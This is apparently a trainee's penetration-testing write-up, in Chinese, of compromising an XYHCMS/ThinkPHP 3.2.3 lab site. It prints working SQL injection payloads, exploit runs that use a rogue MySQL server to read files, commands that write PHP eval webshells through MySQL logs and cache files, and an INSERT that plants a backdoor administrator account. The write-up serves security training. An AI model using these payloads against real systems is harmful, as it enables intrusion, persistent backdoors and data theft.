渗透过程

这篇文章是学员考核的第三篇文章，思路很nice


0x00 开局思路


目标网站是XYHCMS，看到是什么cms首先肯定想的是有没有历史漏洞，百度+谷歌搜了一波得到了前台的sqli文章，后台的文件上传、修改模板等等getshell文章。刚开始的思路就是：sqli拿到管理员密码解密进后台，后台上传getshell。从官网看了一下这个cms的信息

看到最新的是3.6版本，而且官方也是有发布补丁了的，这个时候我的思路是要去下载补丁之前的版本来审，通过diff补丁文件和前一个版本的文件差异来确认漏洞点，然而实际上这条思路下载好两个版本的源码后也没付诸行动，因为想到前不久才复现了一下tp3.2.3的数组+exp的sqli注入漏洞（自推一下我的php学习repo），于是就光想利用这个漏洞来打了，但是最后也没有行的通，因为我发现基本上传参进去的地方都用了intval过滤器，而当时我的关注点又都在cid/id这几个参数上，就又浪费了一些时间。

本着sqli的念头，我终于搜到了这篇文章，并且给出了报错注入的payload：

/xyhcms/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20user()),0x3a),1);]=1


但是利用这个注入出来的管理员密码解不出来，考虑到目标CMS的版本应该是最新的，旧洞都修了，又考虑到月师傅说考点有代码审计，就去下载最新版源码准备代码审计。

没一会儿就看到App\Common\Common\function.php内的get_cookie方法有unserialize，想到TP3.2.3有没有能用的反序列化链子呢？然后看见群里也一直有人在说反序列化，就又百度+谷歌了一波找到这个exp，从中又跳转到这两篇文章：痛失CVE之xyhcms（Thinkphp3.2.3）反序列化， ThinkPHPv3.2.* （SQL注入&文件读取）反序列化POP链。

第二篇文章是tp3.2.x反序列化链子的挖掘过程分析。第一篇文章讲的是这条反序列化链子在xyhcms中的利用。刚开始心想我都有exp了看什么分析文章啊。。。这个时候就误入歧途了，而且我在本地测试3.61012版本（20210602的补丁之前的版本）用这个exp直接打一点问题没有，就坐等月师傅恢复靶场。

0x01 打点历程

在用exp打的时候发现exp提示notfind cookie encode key，而我用3.61012版本是没问题的，说明目标是最新版，且最新版对cookieencode key的存放做了改变导致这个exp获取不到了，于是查看exp代码中是怎么获取的key：

function get_key($url){       $u=$url.'/App/Runtime/Data/config/site.php';       $content=send_request($u);       $pattern='/\"CFG_COOKIE_ENCODE\";s:(\w+):\"(\w+)\"/';       preg_match($pattern,$content,$matches);       if($matches[2]==""or!isset($matches[2])){           echo"notfind cookie encode key \n";           die();       }else{           echo"findcookie encode key:".$matches[2]."\n\n";       }        return$matches[2];   }


很明显它是访问了App/Runtime/Data/config/site.php得到的，那么最新版为啥不行呢？去最新版的目录下看了一下发现对config文件命名的规则做了变化：


所以exp获取不到key了，于是想到有没有其他办法获取到这个key，点开config/site.php看了下key是在CFG_COOKIE_ENCODE字段，而很多cms都会把配置存在数据库里，连上本地数据库看了一下xyh_config表果然是有的

然后就是报错注入获取这个key

/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(SELECT%20CONCAT(name,0x7e,s_value)%20FROM%20xyh_config%20LIMIT%206,1),0x3a),1);]=1


去访问日志查看结果得到key为P4tzizR6d：

http://103.121.93.206/App/Runtime/Logs/Api/22_05_11.log


然后利用github里讲到的exp+rogue_mysql_server读取文件

php exp.php http://103.121.93.206 vps_ip port root root ""



读取到db配置文件后，将数据库信息改为目标的，就可以执行sql语句了，这里因为网络原因所以时间比正常久了一些

php exp.php http://103.121.93.206 127.0.0.1 3306 root 9a973fd7928bb3c2"select sleep(5)"



然后是想用日志写webshell来着，尝试执行了如下命令

set global slow_query_log=1 set global slow_query_log_file='/www/wwwroot/www.xycms.com/lu2ker.php'select '<?php @eval($_POST[1]);?>' or sleep(11)


没有成功，又尝试

Set global general_log=1; Set global general_log_file='/www/wwwroot/www.xycms.com/lu2ker.php';select'<?php @eval($_POST[1]);?>' or sleep(11)


也没成功，但是在本地测试都成功了，墨迹了一会儿想起来是secure_file_priv的问题，遂放弃。沿用之前的思路执行sql语句插入一个管理员账户，密码hash和salt从本地搭建CMS的库里拿出来用即可：

php exp.php http://103.121.93.206 127.0.0.1 3306 root 9a973fd7928bb3c2" insert intowww_xycms_com.xyh_admin(id,username,password,encrypt,department,realname,email,user_type,login_time,login_ip,is_lock,login_num)values(957,'lu2ker','3dc2ed332142feeef4f42631b215af30','6muMxK','','','','9','2022-05-1122:38:57','',0,0)"

这里有个坑点是在xyh_admin前面必须加上库名，因为exp里面设置的库名是mysql这个自带库，必须制定库名才能正确插入，这里也墨迹了一个小时，最后到凌晨两点终于发现了。。。。。


然后就是后台的getshell，这里又肝了一会儿肝到4点尝试了几乎所有的后台getshell方法都失败，顶不住了去睡觉（该睡就睡，睡醒了思路更清晰）

第二天重新阅读痛失CVE之xyhcms（Thinkphp3.2.3）反序列化这篇文章，感觉这里的getshell方法最靠谱，但是需要知道config目录的命名规则，还是需要去看代码。

根据学习过的TP框架，最开始定位到数据缓存的生成和DATA_PATH常量有关，然后全局搜DATA_PATH，在一堆文件里面看到App\Runtime\common~runtime.php内有hash(md4,xxxxx)这条语句，下断点跟一遍发现config目录的生成是在执行过了这个文件之后，于是确定了这里是关键。

现在缺少的是DATA_CACHE_PREFIX常量的值，继续本地全局搜索发现是在App\Common\Conf\config.php文件里

而这个文件是可以用exp直接读取的

获取到了DATA_CACHE_PREFIX，就把生成语句单独摘出来执行一下就得到了config目录的前缀hash值，这个操作当然也是在本地测试过才确定有效的。

拼接一下即：3277c100b8afcccfb950d28a6ff7113c_config，再用文章中提到的留言板缓存写入shell即可，具体流程为1.后台清除缓存；2. 执行如下命令

php exp.php http://103.121.93.206 127.0.0.1 3306 root 9a973fd7928bb3c2"alter table www_xycms_com.xyh_guestbook add column `<scriptlanguage='php'>eval($_POST['wq']);</script>` varchar(10)"

3.访问留言板生成缓存；4.蚁剑连。

访问http://103.121.93.206/App/Runtime/Data/3277c100b8afcccfb950d28a6ff7113c__fields/www_xycms_com.xyh_guestbook.php
